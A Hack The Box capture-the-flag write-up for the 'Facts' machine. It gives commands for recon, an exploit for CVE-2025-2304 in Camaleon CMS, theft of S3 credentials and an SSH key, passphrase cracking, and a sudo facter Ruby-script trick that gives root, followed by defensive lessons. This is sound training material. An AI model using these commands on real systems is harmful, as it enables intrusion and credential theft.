# Facts — Hack The Box
<img width="1200" height="630" alt="facts-writeup" src="https://github.com/user-attachments/assets/d835655e-bfc6-44f6-8739-2c2595e016c9" />


![](https://img.shields.io/badge/Platform-Hack_The_Box-111927?style=for-the-badge&logo=hackthebox&logoColor=9FEF00)
![](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![](https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge&logo=linux&logoColor=white)
![](https://img.shields.io/badge/Category-Web%20%7C%20Cloud%20%7C%20PrivEsc-orange?style=for-the-badge)

## Summary

Facts is an **Easy** Linux machine on Hack The Box running Camaleon CMS 2.9.0 behind nginx. Self-registration is enabled, and an authenticated privilege escalation vulnerability (**CVE-2025-2304**) promotes any registered user to CMS admin in a single request. The admin panel exposes **AWS S3 credentials** in the media storage settings. Enumerating S3 buckets reveals an `internal` bucket containing an SSH private key with a crackable passphrase. The key's comment field leaks the username (`trivia`), granting SSH access and the **user flag**. Privilege escalation abuses a passwordless sudo rule for `/usr/bin/facter` — its `--custom-dir` flag loads arbitrary Ruby scripts as root, providing a trivial path to SUID bash and the **root flag**.

```
Directory Fuzzing → CMS Registration → CVE-2025-2304 Priv Esc → CMS Admin
  → AWS S3 Creds → Internal Bucket → SSH Key + Passphrase Crack → User Flag
  → sudo facter --custom-dir → Ruby Script → Root Flag
```

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | ID |
|:------|:-------|:----------|:---|
| Port scanning | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Network Service Discovery](https://attack.mitre.org/techniques/T1046/) | `T1046` |
| Directory fuzzing | [Reconnaissance](https://attack.mitre.org/tactics/TA0043/) | [Active Scanning: Vulnerability Scanning](https://attack.mitre.org/techniques/T1595/002/) | `T1595.002` |
| CMS privilege escalation | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) | `T1190` |
| AWS credentials in CMS settings | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) | `T1552.001` |
| S3 bucket enumeration | [Collection](https://attack.mitre.org/tactics/TA0009/) | [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/) | `T1530` |
| SSH private key extraction | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/) | `T1552.004` |
| SSH key passphrase cracking | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Brute Force: Password Cracking](https://attack.mitre.org/techniques/T1110/002/) | `T1110.002` |
| sudo facter abuse | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Abuse Elevation Control: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/) | `T1548.003` |

## CVE Reference

| CVE | CVSS 3.1 | Severity | Description |
|:----|:---------|:---------|:------------|
| [CVE-2025-2304](https://github.com/Alien0ne/CVE-2025-2304) | **8.8** (est.) | High | Camaleon CMS 2.9.0 — authenticated privilege escalation allows any registered user to elevate to admin via crafted request (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |


## Reconnaissance — `T1046` `T1595.002`

### Nmap

```bash
nmap -sC -sV $IP
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
```

Standard setup — SSH on 22, nginx on 80 redirecting to `facts.htb`. Add to `/etc/hosts`.

The site displays images and trivia facts. It looks like a CMS, but the source code doesn't immediately reveal which one.

### Directory Fuzzing

Learned from previous CTFs where small wordlists found nothing — going straight for the big dictionary:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
     -u "http://facts.htb/FUZZ" -ic -c
```

```
rss        [Status: 200]
sitemap    [Status: 200]
search     [Status: 200]
admin      [Status: 302]
post       [Status: 200]
ajax       [Status: 200]
```

The `admin` endpoint returns a 302 redirect — there's an admin panel.

<img width="774" height="765" alt="2026-03-04_03-32" src="https://github.com/user-attachments/assets/624c0ffb-7502-46ee-b79b-4e271dd90246" />

No credentials, but **self-registration is enabled**. Create an account, log in, and the CMS identifies itself: **Camaleon CMS version 2.9.0**.

## Exploitation — `T1190`

### CVE-2025-2304 — CMS Privilege Escalation

A quick search for Camaleon CMS 2.9.0 vulnerabilities reveals [CVE-2025-2304](https://github.com/Alien0ne/CVE-2025-2304) — an authenticated privilege escalation that promotes any registered user to admin in a single request:

```bash
python exploit.py -u http://facts.htb -U test -P test
```

```
[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
   User ID: 5
   Current User Role: client
[+] Loading PRIVILEGE ESCALATION
   User ID: 5
   Updated User Role: admin
[+] Reverting User Role
```

One command. Full admin access.

<img width="1919" height="886" alt="2026-03-04_03-45" src="https://github.com/user-attachments/assets/4ab01d54-da27-4d40-9751-77263d0f2f69" />

### AWS S3 Credentials — `T1552.001` `T1530`

Reverse shells from the CMS didn't work, so I explored the admin settings instead. The media storage configuration reveals something far more valuable:

<img width="1919" height="887" alt="2026-03-04_03-47" src="https://github.com/user-attachments/assets/7b9bec91-ad9b-4396-872f-d795ad9d5322" />

AWS S3 credentials — access key, secret key, bucket name, and endpoint URL — all stored in plaintext in the CMS configuration.

Using the AWS CLI to enumerate the known bucket:

```bash
aws --endpoint-url http://$IP:54321 s3 ls s3://randomfacts --recursive
```

Nothing but images. But listing *all* buckets reveals a second one:

```bash
aws --endpoint-url http://$IP:54321 s3 ls
```

```
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```

The `internal` bucket contains a user's home directory — including an SSH private key:

```
2026-03-04 03:17:40  .ssh/authorized_keys
2026-03-04 03:17:40  .ssh/id_ed25519
```

### SSH Key Cracking — `T1552.004` `T1110.002`

Download the key. It's passphrase-protected:

```bash
ssh2john id_ed25519 > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
dragonballz      (id_ed25519)
```

The username isn't known yet — the key doesn't work for `root`. Removing the passphrase reveals the answer in the key's comment field:

```bash
ssh-keygen -p -f id_ed25519
Enter old passphrase: dragonballz
Key has comment 'trivia@facts.htb'
```

### User Flag

```bash
ssh -i id_ed25519 trivia@facts.htb
```

```bash
trivia@facts:~$ cat /home/william/user.txt
htb{flag}
```

## Privilege Escalation — `T1548.003`

### sudo facter — Custom Directory Abuse

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

`facter` is a system information tool (part of the Puppet ecosystem) that can load **custom facts** — Ruby scripts — from arbitrary directories via the `--custom-dir` flag. Since the sudoers rule specifies no argument restrictions, we control which directory `facter` reads from, and every Ruby file in that directory executes as root.

Create a malicious fact that sets the SUID bit on `/bin/bash`:

```bash
mkdir -p /tmp/privesc
echo 'system("/bin/chmod u+s /bin/bash")' > /tmp/privesc/suid.rb
```

Execute with elevated privileges:

```bash
sudo /usr/bin/facter --custom-dir /tmp/privesc
```

Launch a root shell:

```bash
/bin/bash -p
```

```bash
bash-5.2# id
uid=1000(trivia) gid=1000(trivia) euid=0(root) groups=1000(trivia)

bash-5.2# cat /root/root.txt
rootflag
```

## Lessons Learned

1. **Self-registration on CMS platforms is a foothold waiting to happen.** Camaleon CMS allowed anonymous account creation, and a single authenticated request promoted that account to admin. If self-registration must be enabled, application-level privilege controls need to be bulletproof — CVE-2025-2304 proves they weren't.

2. **Admin panels leak more than admin access.** The CMS admin panel wasn't the end goal — it was a stepping stone to AWS credentials that were casually stored in the media settings. Always enumerate every configuration page after gaining admin access; cloud storage keys, SMTP credentials, and API tokens frequently hide in settings panels.

3. **Always list all S3 buckets, not just the known ones.** The `randomfacts` bucket was a decoy. The `internal` bucket — containing the SSH key — only appeared by running `s3 ls` without specifying a bucket name. Scoping enumeration to a single known resource misses adjacent storage that may contain far more sensitive data.

4. **SSH key comments reveal usernames.** The `id_ed25519` key had no obvious owner until the passphrase was removed, exposing the comment field `trivia@facts.htb`. The `ssh-keygen -p` command is useful not just for passphrase management but as a reconnaissance tool.

5. **Sudoers rules without argument restrictions are privilege escalation guarantees.** The rule `(ALL) NOPASSWD: /usr/bin/facter` with no argument constraints allowed `--custom-dir` to load arbitrary Ruby code as root. The secure version would be `(ALL) NOPASSWD: /usr/bin/facter --no-custom-facts` or, better yet, not granting sudo access to `facter` at all. [GTFOBins](https://gtfobins.github.io/) is the canonical reference for these abusable binaries.

---

*Writeup by [@alfabuster](https://github.com/alfabuster)*
<img width="1920" height="1013" alt="Screenshot From 2026-03-04 16-46-26" src="https://github.com/user-attachments/assets/f19985a0-2034-4015-ae7f-54604649d430" />
